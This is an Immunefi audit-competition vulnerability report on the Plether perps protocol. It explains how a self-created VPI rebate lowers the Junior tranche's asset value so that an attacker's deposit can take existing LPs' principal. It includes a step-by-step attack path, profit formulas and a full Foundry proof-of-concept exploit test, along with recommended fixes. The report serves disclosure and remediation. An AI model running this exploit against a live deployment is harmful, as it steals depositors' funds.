# \#97862 [SC-Critical] Attacker takes Junior LP principal by depositing into the NAV dip that its own VPI rebate creates

**Submitted on Nov 3rd 2026 at 16:49:03 UTC by @W3B_SR_0xki for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97862
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Summary

A skew-reducing open receives a negative VPI rebate R. The pool pays R out of its cash immediately. The trader cannot spend it: the same gross R is locked in the trader's nonwithdrawable VPI rebate reserve. The lifetime VPI clamp guarantees that R goes back to the pool when the position closes or is liquidated.

LP NAV is computed from physical pool assets, so it counts the cash outflow. It does not count the reserve, so it does not count the guaranteed return either. Until the position closes, Junior principal (and the Junior share price) is understated by about R. Every Junior deposit that activates in that window is priced at the understated value. When the position closes, R comes back as revenue and is shared by all Junior shares, including the new ones.

An unprivileged attacker with one LP account and one trader account runs one cycle:

1. Request a Junior deposit before the epoch cutoff.
2. Open a skew-reducing position just before the hourly boundary.
3. Let anyone settle the epoch, so the deposit activates at the dipped price.
4. Close the position.
5. Redeem after the cooldown.

The trader leg nets zero VPI, because the clamp takes back the whole rebate. The attacker's LP leg captures `L·d/(J−d+L)` of existing Junior principal, where d ≈ R is the dip, L is the deposit and J is the existing Junior equity.

The PoC uses release parameters, production entrypoints only, no pranked protocol address and only Pyth/USDG mocks. With a 9.9M USDG pool and 39% organic skew:
- The attacker ends **+2,906.82 USDG** richer in absolute terms.
- Existing Junior LPs lose **5,278.94 USDG** against an identical control.
- That loss equals the attacker's edge plus protocol fees to the atom.

Two cycles double both figures (+5,819.96 / −10,564.20). At a moderate 25% skew the attack still nets +631.78 and costs existing LPs 1,851.96.

## Root cause

### 1. Pool cash falls by the gross rebate R at open
For a skew-reducing open, `tradeCostAssets = vpi + fee < 0`, so the planner sets `poolRebatePayoutAssets = −tradeCost = R − fee` (`libraries/CfdEnginePlanLib.sol:333`). The settlement sidecar pays it out of the pool:

```solidity
// CfdEngineSettlementSidecar.sol:442-444
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

A negative trade cost credits no protocol fee in the clearinghouse. The sidecar then pays the execution fee to the treasury from free pool cash via `_settleProtocolFeeTopUp` (`CfdEngineSettlementSidecar.sol:498` → `:905`). The pool's `accountedAssets` therefore falls by the gross R in total (`HousePool.payOut`, `HousePool.sol:611`). The PoC asserts that equality to the atom.

### 2. The same R is locked in the trader's reserve and always returns to the pool
The open locks the gross rebate as the trader's VPI rebate reserve: the target is `max(−vpiAccrued, 0)` (`CfdEnginePlanLib.sol:348-349`), locked at `CfdEngineSettlementSidecar.sol:466-478`. On close, the lifetime clamp forces the close VPI up to at least the accrued rebate:

```solidity
// libraries/CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The reserve is consumed into the pool (`clearinghouse.consumeVpiRebateReserve(..., host.pool(), ...)`, `CfdEngineSettlementSidecar.sol:691-693`). It is booked as `ClaimantInflowKind.Revenue` (`:604-612` → `HousePool.recordClaimantInflow`, `HousePool.sol:624`, `accountedAssets += amount`). The reconcile waterfall assigns revenue to any Senior high-water-mark shortfall first and the rest to Junior (`HousePoolWaterfallAccountingLib.distributeRevenue`, `:140`). R is therefore a fully collateralized receivable of the pool, certain to come back.

### 3. Junior entries are priced on a NAV that counts the outflow but not the receivable
- **NAV inputs:** `CfdEngineProtocolLens.getHousePoolInputSnapshot` (`:59-73`) supplies `physicalAssets = pool.totalAssets()`, the terminal price delta and trader claims.
- **NAV formula:** `HousePoolAccountingLib.buildReconcileSnapshot` (`:60-78`) computes `distributable = physical + terminalDelta − claims`. No reserve term exists.
- **Reconcile:** `HousePool._settleLpEpoch` reconciles first (`HousePool.sol:835`). The payout is booked as a loss through `absorbLoss`, Junior first.
- **Deposit pricing:** Junior deposits activate at `juniorPrincipal / _juniorShareSupply()` with an entry fee hard-coded to 0 (`HousePool.sol:914-920`).

### 4. The epoch rules do not prevent it
- **Cutoff:** the 5-minute cutoff only freezes *membership* of the maturing epoch. The attacker creates the dip after the cutoff with its own trade and removes it right after activation.
- **Activation gates:** no gate considers outstanding rebate reserves. `_entriesMaySettle` and `trancheDepositsAllowed` check frozen, degraded, deficit, pause, unassigned assets, mark and Senior impairment.
- **Settlement:** `OrderRouter.settleLpEpoch` is permissionless; in the PoC an unrelated keeper calls it.
- **Free abort:** a pending Junior deposit can be cancelled until maturity (SECURITY.md:878-879). If the trade fails to execute in time, the attacker withdraws at no cost.

## Why this is not intended or documented

**What the protocol says it wants:**
- `CloseAccountingLib.sol:112-115`: the lifetime clamp exists to "Prevent[] LP sandwich attacks" built on VPI rebates.
- SECURITY.md:1443: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips".
  - In this attack the trader leg is exactly such a rebate-only round trip (VPI nets to zero). The value comes out through the LP leg instead.
- SECURITY.md:859-861 ("Exact symmetric LP NAV"): "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV".
- ACCOUNTING_SPEC.md:357: revenue with no eligible owner is quarantined so that "a new depositor cannot acquire it simply by being first to deposit".

**What the docs say about the reserve:** they keep it out of NAV for one stated reason, which is to stop *existing* LPs from extracting it before it is earned.
- ACCOUNTING_SPEC.md:821-822: the VPI reserve "cannot be extracted by LPs before its account obligation settles".
- WHITEPAPER.md:887-888: "so LPs cannot withdraw it as marked equity before the matching position obligation settles".

**The passages a reader might cite, and why they don't cover this:**
- ACCOUNTING_SPEC.md:140-142, ACCOUNTING_SPEC.md:1064-1066 and SECURITY.md:872 say VPI and action reserves are kept out of the *marked price curve*. Here, though, the rebate *cash outflow* does enter NAV, through `physicalAssets`; only the offsetting receivable is left out. No document says that a fully reserved, guaranteed-to-return rebate is booked as an immediate Junior loss that entrants may buy.
- ACCOUNTING_SPEC.md:171-173 says entrants are credited only for collectible marked receivables. That is a rule about marked trader PnL, not about rebate cash advanced against a reserve.
- SECURITY.md:1047 says trading can change NAV before an epoch settles. That describes real economic changes, not an attacker-created, self-reversing accounting dip.

**Not a known issue.** Nothing matching appears in:
- SECURITY.md Known Limitations, including "VPI limitations" (:1434-1444) and "LP accounting limitations";
- the Cecuro report: LOW-13 is rounding dust; LOW-34, MED-7 and MED-22 are unrelated;
- the SC Audit Studio pre-audit;
- the AI scan: its VPI items (claims-inflated depth, and temporary depth changes around a close) manipulate the *size* of VPI, not NAV recognition of the rebate, and their fixes would not fix this;
- the Cantina and collaborative reports.

## Attack path (all steps permissionless)

| Time | Actor | Call | Effect |
|---|---|---|---|
| b − 900 s | attacker LP | `juniorVault.requestDeposit(L, lp, lp)` | Deposit queued for the epoch starting at boundary b |
| b − 120 s | attacker trader | V3 `OrderRouter.commitOrder(request)`, then self-executed `OrderRouter.executeOrder` | Skew-reducing SHORT. Pool pays R; R locked in the trader's reserve |
| b + 5 s | anyone (here an unrelated keeper) | `OrderRouter.settleLpEpoch(pythData)` | Reconcile books −R against Junior; the attacker's deposit activates at the dipped price |
| right after | attacker trader | commit + execute the close; `clearinghouse.withdraw` | The clamp consumes R into the pool as revenue; the trader is flat |
| b + 1 h | attacker LP | `requestRedeem(shares)` | Requested after the 1 h activation cooldown, for the next boundary |
| b + 2 h | anyone | `settleLpEpoch`, then `claimRedeem` | The attacker leaves with `L + L·d/(J−d+L)` minus its share of the coupon |

## Impact

**Victims.** The victims are every existing Junior LP. Their principal permanently drops by `L·d/(J−d+L) − (1−f′)·2σx`, with `f′ = L/(J−d+L)`, σ the adverse-confidence shift per unit of notional and x the trade size.

**The attacker's take.** The attacker gets that amount minus two 4 bps execution fees (which go to the treasury). No yield is involved:
- The only economic events are the attacker's own round-trip trades.
- The trader leg's VPI nets to zero.
- In every run the existing Junior position ends *below its own pre-attack value* (e.g. 2,007,729.62 → 2,002,342.42 USDG, against 2,007,621.36 in the control).

So this is principal moving from existing LPs to the attacker. It is not "unclaimed yield".

**Measured at release parameters** (pool 9.9M USDG, existing Junior about 2.0M):

| Organic skew | Attacker deposit L | Trade x | R | Attacker net (absolute) | Edge vs identical LP round trip | Existing Junior LP loss | Treasury fees |
|---|---|---|---|---|---|---|---|
| 39% | 6,000,000 | 2.83M | 7,098.26 | +2,906.82 | +3,014.94 | 5,278.94 | 2,264.00 |
| 39% | 2,000,000 | 2.32M | 6,416.19 | +1,235.40 | +1,307.40 | 3,163.40 | 1,856.00 |
| 25% | 6,000,000 | 1.39M | 2,498.47 | +631.78 | +739.96 | 1,851.96 | 1,112.00 |
| 39%, two cycles | 6,000,000 | 2.83M ×2 | 14,200.22 | +5,819.96 | +6,036.20 | 10,564.20 | 4,528.00 |

- **Conservation:** in every case the existing-LP loss equals the attacker's edge plus the treasury fees, to the atom. The loss is a pure transfer, not a rounding, carry or coupon artifact. Senior LP value is identical in the attack and control runs.
- **Profitability condition:** with skew ratio s = S/D, vpiFactor k = 0.01 and cost c ≈ 8 bps plus confidence:
  - optimal trade: `x* = D·(s − c/(f′k))`;
  - profit: `(f′k/2)·(s − c/(f′k))²·D`;
  - break-even skew: about 16% at f′ = 0.5, 11% at f′ = 0.75 and 9% at f′ = 0.9.
  - The per-cycle extraction is bounded by `R ≤ k·s²·D/2` (8 bps of depth at the 40% cap) and scales linearly with pool size.
- **Cadence:** entry at T, redeem request at T + 1 h, funding at T + 2 h, so one wallet pair can run a cycle every 3 h (≤ 8 per day) while organic skew stays high. The two-cycle test demonstrates the repetition.
  - Over a sustained high-skew day that would be about 1–2% of Junior principal (≈ 23–42k USDG/day at the PoC pool size). This daily figure is an extrapolation of the proven cycles, not a separate test.
- **Second victim class:** Junior LPs whose redemptions settle at a dipped boundary are underpaid by their share of R.
- **Privileges and assumptions:**
  - No privileged role, oracle manipulation or price move is needed.
  - Price risk is zero-mean and can be hedged outside the protocol: about 2 minutes of trader exposure and about 2 hours of Junior exposure. The PoC holds the price constant to isolate the mechanism.
  - Capital needs are within the program's no-downgrade range.

## Proof of concept

Place the file below at `packages/perps/test/perps/PoC_D15_VpiRebateNavDip.t.sol` and run, from the repository root:

```
git submodule update --init --recursive
forge test --root packages/perps --match-path test/perps/PoC_D15_VpiRebateNavDip.t.sol -vv
```

**What the PoC uses:**
- It builds on the repo's own `BasePerpTest` stack, with no in-scope contract modified and no protocol address pranked.
- The Junior (victim) and Senior tranches are funded through the normal async LP flow: `requestDeposit`, then `OrderRouter.updateMarkPrice`, then the permissionless `HousePool.settleLpEpoch(0,0)` while no position exists, then `claimDeposit`.
- Every later step uses production entrypoints: V3 `OrderRouter.commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice` and `settleLpEpoch` (called by an unrelated keeper), `TrancheVault` request/claim functions, and `MarginClearinghouse` `deposit` / `withdraw`.
- `BasePerpTest`'s router is the repo's `LegacyOrderRouterHarness`. It inherits the production `OrderRouter` and only adds a scalar `commitOrder` overload, which the PoC does not use.
- Only MockPyth (the repo's default 2-feed basket) and the mock settlement token are mocks. The mechanism depends only on VPI and LP NAV accounting, not on basket composition or price path.

**Configuration:**
- release risk parameters (vpiFactor 0.01, maxSkew 0.4, margins 10/20/300 bps, carry 500 bps, bounty 10 bps / keeper share 50%);
- execution fee 4 bps and settlement buffer 25 bps;
- adverse-confidence multiplier 2500 bps with a realistic 0.5 bp Pyth confidence;
- Senior capacity 40M / 8000 bps, and 1 USDG seeds.

**Structure:** each test runs the attack and an identical control (same LP deposit and redemption timing, no trade) from the same snapshot, time and block. It asserts:
- pool cash falls by exactly R at open;
- the clawback returns at least R at close;
- the deposit activates at a discount;
- the attacker's absolute profit and edge are positive;
- existing Junior LPs lose value, and that loss equals the attacker's edge plus treasury fees.


## Recommendation

Recognize outstanding VPI rebate reserves as a pool asset when pricing LP entries and exits. Every unit is collateralized in the clearinghouse and, under the lifetime clamp, can only flow back to the pool on close or liquidation. Two options:
- Add the aggregate rebate reserve, `Σ max(−vpiAccrued, 0)`, to terminal assets in `CfdEngineProtocolLens.getHousePoolInputSnapshot` / `HousePoolAccountingLib.buildReconcileSnapshot`. Keep it out of the physical withdrawal reserve, as is already done for marked receivables, so LPs still cannot redeem it early.
- Alternatively, do not `payOut` a negative open-time rebate. Keep it in the pool as a trader-owned reserve, so pool NAV never dips.

Deferring Junior activation, or charging an entry fee, while net rebate reserves are outstanding would also close the window, but less precisely.

## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: a skew-reducing open's VPI rebate is paid out of HousePool cash (payOut of R - fee plus the fee top-up from
// pool cash), while the matching gross VPI rebate reserve R is locked in the trader's clearinghouse account and is
// excluded from LP NAV. Junior deposits activated while that reserve is outstanding are priced at the dipped
// juniorPrincipal. The lifetime VPI clamp then returns R to the pool at close, booked as revenue that is shared
// with the new shares. An unprivileged trader + LP can create the dip themselves across one LP epoch boundary and
// take value from existing Junior LPs.
//
// Every step after the repo's own BasePerpTest constructor uses production entrypoints only: V3
// OrderRouter.commitOrder(OrderRequest), executeOrder, updateMarkPrice, settleLpEpoch, HousePool.settleLpEpoch
// (permissionless while no position exists), TrancheVault request/claim functions and MarginClearinghouse
// deposit/withdraw. No protocol address is pranked. The tranches are seeded through the normal async LP flow.
// BasePerpTest's router is the repo's LegacyOrderRouterHarness, which only ADDS an unused scalar commit adapter on top
// of the production OrderRouter. Only Pyth (MockPyth) and the settlement token are mocks. Release risk parameters.

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

contract PoC_D15_VpiRebateNavDip is BasePerpTest {

    uint256 internal constant PRICE = 1e8;
    /// @dev 0.5 bp Pyth confidence (realistic FX; the release cap is 10 bps). Release adverse multiplier = 2500 bps.
    uint64 internal constant CONF = 5000;
    uint256 internal constant LOT = 100e18;
    uint256 internal constant TRADER_FUNDING = 100_000e6;

    address internal constant VICTIM_JR = address(0x51C7); // existing Junior LP (victim)
    address internal constant SENIOR_LP = address(0x5E17);
    address internal constant KEEPER = address(0xBEEF); // unrelated settler
    address internal constant ORG1 = address(0xA001);
    address internal constant ORG2 = address(0xA002);
    address internal constant ORG3 = address(0xA003);
    address internal constant ATK_LP = address(0xB0B1);
    address internal constant ATK_TR = address(0xB0B2);

    struct Result {
        int256 attackerPnl;
        uint256 existingJuniorAssets;
        uint256 seniorAssets;
        uint256 treasuryAssets;
        uint256 rebateReserve;
        uint256 poolCashDip;
        uint256 clawbackToPool;
        uint256 sharesMinted;
        uint256 juniorPrincipalAfterActivation;
    }

    // ------------------------------------------------------------------ release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    /// @dev Tranches are funded below through the production async flow instead of the base helper.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.basketMaxConfidenceRatioBps = 10;
        _setRouterConfig(config);
        // A Tuesday 06:00 UTC (02:00 New York): live FX market, far from the Friday FAD / weekend freeze.
        uint256 target = SETUP_TIMESTAMP + 8 days;
        while (target <= vm.getBlockTimestamp()) {
            target += 7 days;
        }
        vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
        // Existing LPs: 2M Junior (victim) and 7.9M Senior (79.8% Senior share, under the 80% release cap).
        _seedTranche(juniorVault, VICTIM_JR, 2_000_000e6);
        _seedTranche(seniorVault, SENIOR_LP, 7_900_000e6);
    }

    // ------------------------------------------------------------------ helpers (production entrypoints only)

    /// @dev Same as BasePerpTest._mockPythUpdateData but with a nonzero, realistic confidence interval.
    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            CONF,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    /// @dev Async LP funding with no open positions: request, mark refresh via Router, permissionless settlement.
    function _seedTranche(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        _refreshMark(KEEPER);
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId) + 5);
        _refreshMark(KEEPER);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimable, assets, "seed deposit activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _request(
        CfdTypes.Side side,
        uint256 lots,
        uint256 marginDelta,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request.clientOrderId = keccak256(abi.encode("PoC-D15", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = lots * LOT;
        request.marginDelta = marginDelta;
        request.isClose = isClose;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Commit through the production V3 commit and self-execute through the production executeOrder.
    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 lots,
        uint256 marginDelta,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, lots, marginDelta, isClose);
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _refreshMark(
        address caller
    ) internal {
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(caller);
        router.updateMarkPrice(updateData);
    }

    /// @dev An unrelated keeper settles the epoch through the permissionless Router entrypoint.
    function _settle() internal {
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
    }

    /// @dev Organic market: three independent traders hold `3 * lotsEach * 100` USDG of net LONG skew.
    function _organicSkew(
        uint256 lotsEach
    ) internal {
        _fundTrader(ORG1, 200_000e6);
        _fundTrader(ORG2, 200_000e6);
        _fundTrader(ORG3, 200_000e6);
        _trade(ORG1, CfdTypes.Side.LONG, lotsEach, 60_000e6, false);
        _trade(ORG2, CfdTypes.Side.LONG, lotsEach, 60_000e6, false);
        _trade(ORG3, CfdTypes.Side.LONG, lotsEach, 60_000e6, false);
    }

    function _existingJuniorAssets() internal view returns (uint256) {
        // Victim LP plus the 1 USDG Junior seed held by the deployer.
        return juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_JR) + juniorVault.balanceOf(address(this)));
    }

    function _treasuryAssets() internal view returns (uint256) {
        address treasury = engine.protocolTreasury();
        return clearinghouse.balanceAssets(treasury) + settlementToken.balanceOf(treasury);
    }

    function _attackerWallet() internal view returns (uint256) {
        return settlementToken.balanceOf(ATK_LP) + settlementToken.balanceOf(ATK_TR);
    }

    // ------------------------------------------------------------------ one attack (or control) cycle

    /// @param attack false = control: identical LP deposit/redeem timing, no skew-reducing trade.
    function _cycle(
        uint256 lpAssets,
        uint256 xLots,
        bool attack
    ) internal returns (Result memory res) {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 boundary = (nowTs / 3600 + 1) * 3600;
        if (boundary - nowTs < 1200) boundary += 3600;
        uint256 walletBefore = _attackerWallet();

        // (1) Before the 5-minute cutoff, the attacker requests a Junior deposit for the epoch starting at `boundary`.
        vm.warp(boundary - 900);
        _refreshMark(KEEPER);
        settlementToken.mint(ATK_LP, lpAssets);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), lpAssets);
        uint256 depositId = juniorVault.requestDeposit(lpAssets, ATK_LP, ATK_LP);
        vm.stopPrank();
        assertEq(juniorVault.depositEpochStart(depositId), boundary, "request targets the next boundary");

        // (2) Shortly before the boundary, a separate attacker account opens a skew-REDUCING SHORT. The pool pays the
        //     rebate out of its cash; the same gross R is locked in the trader's VPI reserve, outside LP NAV.
        if (attack) {
            _fundTrader(ATK_TR, TRADER_FUNDING);
            vm.warp(boundary - 120);
            uint256 accountedBefore = pool.accountedAssets();
            _trade(ATK_TR, CfdTypes.Side.SHORT, xLots, 30_000e6, false);
            res.rebateReserve = clearinghouse.vpiRebateReserveAssets(ATK_TR);
            res.poolCashDip = accountedBefore - pool.accountedAssets();
            assertGt(res.rebateReserve, 0, "skew-reducing open locks a VPI rebate reserve");
            assertEq(res.poolCashDip, res.rebateReserve, "pool cash falls by exactly the gross rebate R");
        }

        // (3) After the boundary an unrelated keeper settles the epoch. Reconcile books the payout as a Junior loss;
        //     the attacker's Junior deposit activates at the dipped juniorPrincipal / supply.
        vm.warp(boundary + 5);
        _settle();
        res.juniorPrincipalAfterActivation = pool.juniorPrincipal();
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATK_LP);
        assertEq(claimable, lpAssets, "deposit activated");
        vm.prank(ATK_LP);
        res.sharesMinted = juniorVault.claimDeposit(depositId, claimable, ATK_LP, ATK_LP);

        // (4) The attacker closes. The lifetime clamp consumes the whole reserve into the pool as revenue.
        if (attack) {
            uint256 accountedBeforeClose = pool.accountedAssets();
            _trade(ATK_TR, CfdTypes.Side.SHORT, xLots, 0, true);
            res.clawbackToPool = pool.accountedAssets() - accountedBeforeClose;
            assertEq(clearinghouse.vpiRebateReserveAssets(ATK_TR), 0, "reserve fully consumed");
            assertGe(res.clawbackToPool, res.rebateReserve, "the clawback returns at least R to the pool");
            (uint256 size,,,,,,) = engine.positions(ATK_TR);
            assertEq(size, 0, "attacker trader is flat");
            uint256 free = clearinghouse.getAccountAssetBuckets(ATK_TR).freeSettlementAssets;
            vm.prank(ATK_TR);
            clearinghouse.withdraw(ATK_TR, free);
        }

        // (5) After the 1h deposit cooldown, redeem every new share at the next epoch and claim the USDG.
        vm.warp(boundary + 5 + 3600 + 10);
        vm.prank(ATK_LP);
        uint256 redeemId = juniorVault.requestRedeem(res.sharesMinted, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(redeemId) + 5);
        _settle();
        assertGt(juniorVault.claimableRedeemAssets(redeemId, ATK_LP), 0, "redemption funded");
        vm.prank(ATK_LP);
        juniorVault.claimRedeem(redeemId, res.sharesMinted, ATK_LP, ATK_LP);

        uint256 minted = lpAssets + (attack ? TRADER_FUNDING : 0);
        res.attackerPnl = int256(_attackerWallet()) - int256(walletBefore) - int256(minted);
        res.existingJuniorAssets = _existingJuniorAssets();
        res.seniorAssets = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
        res.treasuryAssets = _treasuryAssets();
    }

    function _runAndCompare(
        uint256 lpAssets,
        uint256 xLots,
        uint256 cycles
    ) internal returns (Result memory atk, Result memory ctl) {
        uint256 startTs = vm.getBlockTimestamp();
        uint256 startBlock = vm.getBlockNumber();
        uint256 existingBefore = _existingJuniorAssets();
        uint256 snapshot = vm.snapshotState();
        for (uint256 i; i < cycles; ++i) {
            Result memory r = _cycle(lpAssets, xLots, true);
            atk.attackerPnl += r.attackerPnl;
            atk.rebateReserve += r.rebateReserve;
            atk.poolCashDip += r.poolCashDip;
            atk.clawbackToPool += r.clawbackToPool;
            atk.sharesMinted = r.sharesMinted;
            atk.juniorPrincipalAfterActivation = r.juniorPrincipalAfterActivation;
            atk.existingJuniorAssets = r.existingJuniorAssets;
            atk.seniorAssets = r.seniorAssets;
            atk.treasuryAssets = r.treasuryAssets;
        }
        vm.revertToState(snapshot);
        vm.warp(startTs);
        vm.roll(startBlock);
        for (uint256 i; i < cycles; ++i) {
            Result memory r = _cycle(lpAssets, xLots, false);
            ctl.attackerPnl += r.attackerPnl;
            ctl.sharesMinted = r.sharesMinted;
            ctl.juniorPrincipalAfterActivation = r.juniorPrincipalAfterActivation;
            ctl.existingJuniorAssets = r.existingJuniorAssets;
            ctl.seniorAssets = r.seniorAssets;
            ctl.treasuryAssets = r.treasuryAssets;
        }

        int256 edge = atk.attackerPnl - ctl.attackerPnl;
        int256 existingLoss = int256(ctl.existingJuniorAssets) - int256(atk.existingJuniorAssets);
        int256 treasuryEdge = int256(atk.treasuryAssets) - int256(ctl.treasuryAssets);
        console2.log("== cycles                                   ", cycles);
        console2.log("attacker Junior deposit per cycle (atoms)   ", lpAssets);
        console2.log("skew-reducing SHORT notional (USDG)         ", xLots * 100);
        console2.log("sum of rebate reserves R (atoms)            ", atk.rebateReserve);
        console2.log("sum of pool cash paid at open (atoms)       ", atk.poolCashDip);
        console2.log("sum of clawback into pool at close (atoms)  ", atk.clawbackToPool);
        console2.log("juniorPrincipal after last activation: atk  ", atk.juniorPrincipalAfterActivation);
        console2.log("juniorPrincipal after last activation: ctl  ", ctl.juniorPrincipalAfterActivation);
        console2.log("Junior shares minted (last cycle): attack   ", atk.sharesMinted);
        console2.log("Junior shares minted (last cycle): control  ", ctl.sharesMinted);
        console2.log("attacker total PnL: attack (atoms)          ", atk.attackerPnl);
        console2.log("attacker total PnL: control (atoms)         ", ctl.attackerPnl);
        console2.log("attack edge over control (atoms)            ", edge);
        console2.log("existing Junior LP value before (atoms)     ", existingBefore);
        console2.log("existing Junior LP value after: attack      ", atk.existingJuniorAssets);
        console2.log("existing Junior LP value after: control     ", ctl.existingJuniorAssets);
        console2.log("existing Junior LP loss vs control (atoms)  ", existingLoss);
        console2.log("protocol treasury fee edge (atoms)          ", treasuryEdge);
        console2.log("Senior LP value: attack / control           ", atk.seniorAssets, ctl.seniorAssets);

        assertGt(atk.sharesMinted, ctl.sharesMinted, "deposit activated at a discount");
        assertGt(ctl.juniorPrincipalAfterActivation, atk.juniorPrincipalAfterActivation, "activation NAV dipped");
        assertGt(atk.attackerPnl, 0, "attacker ends with more USDG than it started with");
        assertGt(edge, 0, "attack beats the identical passive LP round trip");
        assertGt(existingLoss, 0, "existing Junior LPs lose value");
        // Conservation: the existing LPs' loss is exactly the attacker's edge plus protocol fees (no pool loss,
        // rounding, coupon or carry artifact).
        assertApproxEqAbs(existingLoss, edge + treasuryEdge, 1e6, "loss == attacker edge + treasury fees");
    }

    // ------------------------------------------------------------------ tests

    /// @notice 39% organic skew; attacker brings ~3x existing Junior equity (f' ~ 0.75).
    function test_D15_skew39_f075() public {
        _organicSkew(13_000);
        _runAndCompare(6_000_000e6, 28_300, 1);
    }

    /// @notice 39% organic skew; attacker brings ~1x existing Junior equity (f' ~ 0.5).
    function test_D15_skew39_f050() public {
        _organicSkew(13_000);
        _runAndCompare(2_000_000e6, 23_200, 1);
    }

    /// @notice Moderate 25% organic skew; attacker brings ~3x existing Junior equity.
    function test_D15_skew25_f075() public {
        _organicSkew(8_250);
        _runAndCompare(6_000_000e6, 13_900, 1);
    }

    /// @notice The cycle repeats: two back-to-back cycles (about 3h each) at 39% organic skew.
    function test_D15_twoCycles_skew39_f075() public {
        _organicSkew(13_000);
        _runAndCompare(6_000_000e6, 28_300, 2);
    }

}
```
